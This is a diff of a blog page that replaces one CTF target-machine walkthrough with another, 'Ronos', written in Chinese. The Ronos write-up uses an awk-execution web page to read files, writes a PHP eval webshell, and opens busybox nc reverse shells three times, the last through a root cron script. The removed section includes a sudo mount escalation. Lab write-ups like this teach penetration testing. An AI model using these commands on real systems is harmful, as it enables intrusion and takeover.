@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
   
   <title>
-    monitor靶机 |
+    Ronos靶机复现 |
     
     S@Ku_yA的blog
   </title>
@@ -35,36 +35,39 @@
 
   
   
-    <meta name="description" content="monitor靶机端口信息搜索端口信息  有个web服务 web网页访问过去是一个登录框  随便尝试几个密码 admin:admin登进去 发现没有可以用的点 就是个静态页面 用Tscan工具爆破一下目录  找到zabbix的后台页面  网上搜索一下zabbix的默认密码 找到Admin:zabbix 成功登录  在这个后台找了一下功能点 有一个文件上传和一个执行脚本 一开始一直在尝试文件上传 发">
+    <meta name="description" content="Ronos靶机复现端口扫描 访问一下80端口 信息搜集 是一个可以执行awk命令的网站 只要跟上模式就可以了  成功输出sample.txt user既然可以读文件 那么我们可以直接读一下&#x2F;etc&#x2F;passwd   成功读到2个普通用户 我们直接读flag  成功读取flag flag{user-0c4da5e7f8a886869575ae0a046f1841}  root该如">
 <meta property="og:type" content="article">
-<meta property="og:title" content="monitor靶机">
-<meta property="og:url" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:title" content="Ronos靶机复现">
+<meta property="og:url" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="S@Ku_yA的blog">
-<meta property="og:description" content="monitor靶机端口信息搜索端口信息  有个web服务 web网页访问过去是一个登录框  随便尝试几个密码 admin:admin登进去 发现没有可以用的点 就是个静态页面 用Tscan工具爆破一下目录  找到zabbix的后台页面  网上搜索一下zabbix的默认密码 找到Admin:zabbix 成功登录  在这个后台找了一下功能点 有一个文件上传和一个执行脚本 一开始一直在尝试文件上传 发">
+<meta property="og:description" content="Ronos靶机复现端口扫描 访问一下80端口 信息搜集 是一个可以执行awk命令的网站 只要跟上模式就可以了  成功输出sample.txt user既然可以读文件 那么我们可以直接读一下&#x2F;etc&#x2F;passwd   成功读到2个普通用户 我们直接读flag  成功读取flag flag{user-0c4da5e7f8a886869575ae0a046f1841}  root该如">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/1.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/2.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/3.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/4.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/5.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/6.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/7.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/8.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/9.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/10.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/11.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/12.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/13.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/14.png">
-<meta property="og:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/15.png">
-<meta property="article:published_time" content="2025-09-28T15:19:54.000Z">
-<meta property="article:modified_time" content="2025-09-29T04:20:35.783Z">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162317959.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162326691.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162413239.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162752116.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162745398.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162847297.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163425348.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163532149.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163742779.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164206509.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164328024.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164513742.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164938043.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009165959568.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009170436729.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009180710394.png">
+<meta property="og:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009180739453.png">
+<meta property="article:published_time" content="2025-10-09T07:55:00.000Z">
+<meta property="article:modified_time" content="2025-10-09T10:12:16.637Z">
 <meta property="article:author" content="S@Ku_yA">
 <meta property="article:tag" content="mazesec">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="打靶">
+<meta property="article:tag" content="知识">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/1.png">
+<meta name="twitter:image" content="http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162317959.png">
   
   
     <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
@@ -219,7 +222,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="monitor靶机">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="Ronos靶机复现">
         
       
     
@@ -230,7 +233,7 @@
         
         
           <span id="logo">
-            <h1 data-aos="slide-up">monitor靶机</h1>
+            <h1 data-aos="slide-up">Ronos靶机复现</h1>
           </span>
         
       
@@ -260,7 +263,7 @@
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#monitor%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">monitor靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%BD%91%E9%A1%B5"><span class="toc-number">1.2.</span> <span class="toc-text">web网页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">1.3.</span> <span class="toc-text">root</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">Ronos靶机复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user"><span class="toc-number">1.3.</span> <span class="toc-text">user</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">1.4.</span> <span class="toc-text">root</span></a></li></ol></li></ol>
   
 </div>
 </div>
@@ -353,13 +356,13 @@
   
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-monitor靶机" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-Ronos靶机复现" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2025-09-28T15:19:54.000Z" itemprop="datePublished">2025-09-28</time>
-    <time style="display: none;" id="post-update-time">2025-09-29</time>
+    <time datetime="2025-10-09T07:55:00.000Z" itemprop="datePublished">2025-10-09</time>
+    <time style="display: none;" id="post-update-time">2025-10-09</time>
   </span>
   
 </div>
@@ -378,58 +381,66 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="monitor靶机"><a href="#monitor靶机" class="headerlink" title="monitor靶机"></a>monitor靶机</h1><h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><p>搜索端口信息</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/1.png" alt="1"></p>
-<p>有个web服务</p>
-<h2 id="web网页"><a href="#web网页" class="headerlink" title="web网页"></a>web网页</h2><p>访问过去是一个登录框</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/2.png" alt="2"></p>
-<p>随便尝试几个密码</p>
-<p>admin:admin登进去</p>
-<p>发现没有可以用的点</p>
-<p>就是个静态页面</p>
-<p>用Tscan工具爆破一下目录</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/3.png" alt="3"></p>
-<p>找到zabbix的后台页面</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/4.png" alt="4"></p>
-<p>网上搜索一下zabbix的默认密码</p>
-<p>找到Admin:zabbix</p>
-<p>成功登录</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/5.png" alt="5"></p>
-<p>在这个后台找了一下功能点</p>
-<p>有一个文件上传和一个执行脚本</p>
-<p>一开始一直在尝试文件上传</p>
-<p>发现并没有漏洞点</p>
-<p>来到执行脚本这里</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/6.png" alt="6"></p>
-<p>我们把命令改成弹shell</p>
-<p>然后执行命令</p>
-<p>点击ping</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/7.png" alt="7"></p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/8.png" alt="8"></p>
+        <h1 id="Ronos靶机复现"><a href="#Ronos靶机复现" class="headerlink" title="Ronos靶机复现"></a>Ronos靶机复现</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162317959.png" alt="image-20251009162317959"></p>
+<p>访问一下80端口</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162326691.png" alt="image-20251009162326691"></p>
+<p>是一个可以执行awk命令的网站</p>
+<p>只要跟上模式就可以了</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162413239.png" alt="image-20251009162413239"></p>
+<p>成功输出sample.txt</p>
+<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>既然可以读文件 那么我们可以直接读一下&#x2F;etc&#x2F;passwd</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162752116.png" alt="image-20251009162752116"></p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162745398.png" alt="image-20251009162745398"></p>
+<p>成功读到2个普通用户</p>
+<p>我们直接读flag</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009162847297.png" alt="image-20251009162847297"></p>
+<p>成功读取flag</p>
+<p>flag{user-0c4da5e7f8a886869575ae0a046f1841} </p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>该如何提权呢</p>
+<p>百度了一下</p>
+<p>发现awk命令可以写入文件</p>
+<p>那么我们直接写一个一句话就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;BEGIN&#123;print &quot;&lt;?php eval($_POST[\&quot;a\&quot;])?&gt;&quot; &gt; &quot;/var/www/html/shell.php&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163425348.png" alt="image-20251009163425348"></p>
+<p>成功连接上webshell</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163532149.png" alt="image-20251009163532149"></p>
+<p>反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox nc 192.168.1.124 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
 <p>成功拿到shell</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/9.png" alt="9"></p>
-<p>切到home目录有个hyh账号</p>
-<p>成功拿到user的flag</p>
-<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>查找可以以sudo执行的命令</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/10.png" alt="10"></p>
-<p>并没有可以执行的命令</p>
-<p>这里直接去找hyh的密码</p>
-<p>通过一顿翻找</p>
-<p>最后在配置文件中发现不知道是什么账号的密码</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/11.png" alt="11"></p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/12.png" alt="12"></p>
-<p>尝试密码 发现是hyh的密码</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/13.png" alt="13"></p>
-<p>看看这个账号有没有可以以sudo执行的命令</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/14.png" alt="14"></p>
-<p>有一个mount命令</p>
-<p>查找有关信息</p>
-<p>发现我们可以挂载文件</p>
-<p>于是</p>
-<p><code>sudo mount -o /bin/bash /bin/mount</code></p>
-<p><code>sudo mount</code></p>
-<p>拿到root权限</p>
-<p><img src="/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/15.png" alt="15"></p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009163742779.png" alt="image-20251009163742779"></p>
+<p>经过一顿翻找 没有发现密码</p>
+<p>但是在进程中找到一些东西</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164206509.png" alt="image-20251009164206509"></p>
+<p>twansh用户执行了一个脚本</p>
+<p>我们去看一下这个脚本的内容</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164328024.png" alt="image-20251009164328024"></p>
+<p>大致内容是执行command_pipe这个文件</p>
+<p>我们去看看command_pipe这个文件</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164513742.png" alt="image-20251009164513742"></p>
+<p>command_pipe这个文件的属组刚好是我们www-data的组</p>
+<p>我们可以写入这个文件</p>
+<p>那么继续弹shell就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;busybox nc 192.168.1.124 3333 -e /bin/bash&quot;&gt;command_pipe</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到twansh用户</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009164938043.png" alt="image-20251009164938043"></p>
+<p>我们看看如何提权到root</p>
+<p>又是一顿找 没啥结果</p>
+<p>我们起一个pspy64上去 看看有没有隐藏的定时任务</p>
+<p>用蚁剑上传</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009165959568.png" alt="image-20251009165959568"></p>
+<p>执行了一会pspy64</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009170436729.png" alt="image-20251009170436729"></p>
+<p>发现每分钟一开始都会有个动作</p>
+<p>root会执行&#x2F;tmp&#x2F;back.sh</p>
+<p>那么我们直接写入这个文件就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;busybox nc 192.168.1.124 5555 -e /bin/bash&quot;&gt;/tmp/back.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009180710394.png" alt="image-20251009180710394"></p>
+<p>成功提权到root</p>
+<p><img src="/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251009180739453.png" alt="image-20251009180739453"></p>
 
       
     </div>
@@ -443,7 +454,7 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/mazesec/" rel="tag" title="mazesec">mazesec</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/wp/" rel="tag" title="wp">wp</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%89%93%E9%9D%B6/" rel="tag" title="打靶">打靶</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/mazesec/" rel="tag" title="mazesec">mazesec</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/wp/" rel="tag" title="wp">wp</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%89%93%E9%9D%B6/" rel="tag" title="打靶">打靶</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
 
 
     </footer>
@@ -451,37 +462,20 @@
   
   <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
     
-      
-      <div class="article-nav-link-wrap left">
-        
-          
-          
-            <img data-src="/covers/flander.png" data-sizes="auto" alt="paste靶机" class="lazyload">
-          
-        
-        <a href="/2025/09/28/paste%E9%9D%B6%E6%9C%BA/" aria-label="前一篇: paste靶机" title="前一篇: paste靶机"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            paste靶机
-          
-        </h3>
-      </div>
-    
     
     
     <div class="article-nav-link-wrap right">
       
         
         
-          <img data-src="/covers/2341663_p0.jpg" data-sizes="auto" alt="mayuri靶机" class="lazyload">
+          <img data-src="/covers/Image_1719707500972.jpg" data-sizes="auto" alt="logi靶机" class="lazyload">
         
       
-      <a href="/2025/09/28/mayuri%E9%9D%B6%E6%9C%BA/" aria-label="后一篇: mayuri靶机"  title="后一篇: mayuri靶机"></a>
+      <a href="/2025/10/01/logi%E9%9D%B6%E6%9C%BA/" aria-label="后一篇: logi靶机"  title="后一篇: logi靶机"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          mayuri靶机
+          logi靶机
         
       </h3>
     </div>
@@ -589,7 +583,7 @@
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#monitor%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">monitor靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%BD%91%E9%A1%B5"><span class="toc-number">1.2.</span> <span class="toc-text">web网页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">1.3.</span> <span class="toc-text">root</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">Ronos靶机复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user"><span class="toc-number">1.3.</span> <span class="toc-text">user</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">1.4.</span> <span class="toc-text">root</span></a></li></ol></li></ol>
   
 </div>
 </div>
@@ -765,13 +759,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "S@Ku_yA",
-          title: "monitor靶机",
-          url: "http://example.com/2025/09/28/monitor%E9%9D%B6%E6%9C%BA/",
+          title: "Ronos靶机复现",
+          url: "http://example.com/2025/10/09/Ronos%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/",
           excerpt: "",
           description: "",
-          stripContent: "monitor靶机端口信息搜索端口信息  有个web服务 web网页访问过去是一个登录框  随便尝试几个密码 admin:admin登进去 发现没有可以用的点 就是个静态页面 用Tscan工具爆破一下目录  找到zabbix的后台页面  网上搜索一下zabbix的默认密码 找到Admin:zabbix 成功登录  在这个后台找了一下功能点 有一个文件上传和一个执行脚本 一开始一直在尝试文件上传 发现并没有漏洞点 来到执行脚本这里  我们把命令改成弹shell 然后执行命令 点击ping   成功",
-          date: "Sun Sep 28 2025 23:19:54 GMT+0800",
-          updated: "Mon Sep 29 2025 12:20:35 GMT+0800",
+          stripContent: "Ronos靶机复现端口扫描 访问一下80端口 信息搜集 是一个可以执行awk命令的网站 只要跟上模式就可以了  成功输出sample.txt user既然可以读文件 那么我们可以直接读一下&amp;#x2F;etc&amp;#x2F;passwd   成功读到2个普通用户 我们直接读flag  成功读取flag flag{user-0c4da5e7f8a886869575ae0a046f1841}  root该如何提权呢 百度了一下 发现awk命令可以写入文件 那么我们直接写一个一句话就可以了 1&amp;#x27;B",
+          date: "Thu Oct 09 2025 15:55:00 GMT+0800",
+          updated: "Thu Oct 09 2025 18:12:16 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
